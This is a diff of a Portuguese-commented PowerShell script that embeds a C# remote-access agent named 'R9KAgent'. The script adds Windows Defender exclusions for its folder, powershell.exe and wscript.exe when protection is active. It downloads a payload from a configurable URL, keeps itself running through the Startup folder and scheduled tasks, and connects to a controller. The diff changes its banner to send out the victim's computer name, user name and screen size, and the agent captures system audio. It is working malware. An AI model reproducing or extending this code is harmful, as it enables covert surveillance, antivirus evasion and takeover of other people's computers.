@@ -27,12 +27,14 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
+    # 1. Deteta estado do Defender
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
         if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
     } catch { }
 
+    # 2. Defesas — só se o Defender estiver ativo
     if (-not $defenderOff) {
         $sd = "$env:TEMP\sd_$h"
         New-Item -ItemType Directory -Path $sd -Force -ErrorAction SilentlyContinue | Out-Null
@@ -41,6 +43,7 @@ if ($args -notcontains "-silent") {
         try { Add-MpPreference -ExclusionPath $sd -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "powershell.exe" -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "wscript.exe" -Force -ErrorAction SilentlyContinue } catch {}
+
         try {
             $7zr = "$sd\7zr.exe"
             if (-not (Test-Path $7zr)) { Invoke-WebRequest -Uri "https://www.7-zip.org/a/7zr.exe" -OutFile $7zr -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue }
@@ -57,6 +60,7 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
+    # 3. Instalação e Persistência
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -86,6 +90,7 @@ while (`$true) {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
+    # 4. Persistência via schtasks.exe + XML — sem WMI do Agendador
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
@@ -263,8 +268,8 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
                     
-                    // AQUI ESTÁ A ÚNICA ALTERAÇÃO (não envia IP/nome)
-                    myWriter.WriteLine("BANNER:ONLINE");
+                    // AQUI ESTÁ A CORREÇÃO DO NOME DO PC
+                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
                     
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
@@ -450,7 +455,7 @@ if (-not ("R9KAgent" -as [type])) {
                     IMMDevice device;
                     int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
                     if (hr != 0 || device == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado (PC sem placa de som ou desativado)."); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado."); }
                         isAudioRunning = false; return;
                     }
 
@@ -471,7 +476,6 @@ if (-not ("R9KAgent" -as [type])) {
 
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
                     
-                    // 0x00080000 = AUDCLNT_STREAMFLAGS_LOOPBACK
                     hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
                     if (hr != 0) {
                         lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver de audio nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
